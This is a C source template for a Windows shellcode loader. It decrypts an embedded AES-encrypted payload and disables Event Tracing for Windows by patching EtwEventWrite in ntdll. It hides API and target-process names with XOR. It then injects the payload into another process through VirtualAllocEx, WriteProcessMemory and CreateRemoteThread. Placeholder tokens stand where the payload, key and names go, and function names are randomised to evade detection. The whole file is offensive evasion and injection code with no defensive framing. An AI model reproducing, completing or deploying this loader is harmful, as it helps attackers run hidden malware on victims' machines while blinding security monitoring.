


#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

LPVOID (WINAPI * Virt_Alloc)(  LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);

char XOR_VARIABLE []= "XOR_KEY";

unsigned char fRandom6 []=VIRALO}; 
unsigned char Random9[]=PROCY};

int aRandom1(char * eRandom5, unsigned int eRandom5_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, eRandom5, &eRandom5_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int bRandom2(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
 
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int cRandom3(HANDLE hProc, unsigned char * eRandom5, unsigned int eRandom5_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;

  
        pRemoteCode = VirtualAllocEx(hProc, NULL, eRandom5_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        WriteProcessMemory(hProc, pRemoteCode, (PVOID)eRandom5, (SIZE_T)eRandom5_len, (SIZE_T *)NULL);
        
        hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}

void gRandom7(char * tada, int tada_len, char * XOR_VARIABLE, size_t XOR_VARIABLE_len) {
        int r;
        r = 0;
        for (int i = 0; i < tada_len; i++) {
                if (r == XOR_VARIABLE_len - 1) r = 0;

                tada[i] = tada[i] ^ XOR_VARIABLE[r];
                r++;
        }
}


int main(void) {
	void * Random8_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
    
	int pid = 0;
    HANDLE hProc = NULL;
	char dRandom4 []=KEYVALUE  
	unsigned char eRandom5[] =PAYVAL 
 
	unsigned int eRandom5_len = sizeof(eRandom5);

	void * addr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
        VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

        #ifdef _WIN64
        memcpy(addr, "\x48\x33\xc0\xc3", 4);            
        #else
        memcpy(addr, "\x33\xc0\xc2\x14\x00", 5);                
        #endif  

        VirtualProtect(addr, 4096, oldprotect, &oldprotect);

	FreeConsole;

	gRandom7((char *) fRandom6, sizeof (fRandom6), XOR_VARIABLE, sizeof(XOR_VARIABLE));
        Virt_Alloc= GetProcAddress(GetModuleHandle("kernel32.dll"), fRandom6);

	
	Random8_mem = Virt_Alloc(0, eRandom5_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	aRandom1((char *) eRandom5, eRandom5_len, dRandom4, sizeof(dRandom4));
	
	RtlMoveMemory(Random8_mem, eRandom5, eRandom5_len);
	
	rv = VirtualProtect(Random8_mem, eRandom5_len, PAGE_EXECUTE_READ, &oldprotect);

	gRandom7((char *) Random9, sizeof (Random9), XOR_VARIABLE, sizeof(XOR_VARIABLE));
	
	pid = bRandom2(Random9);

	if (pid) {

		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			cRandom3(hProc, eRandom5, eRandom5_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
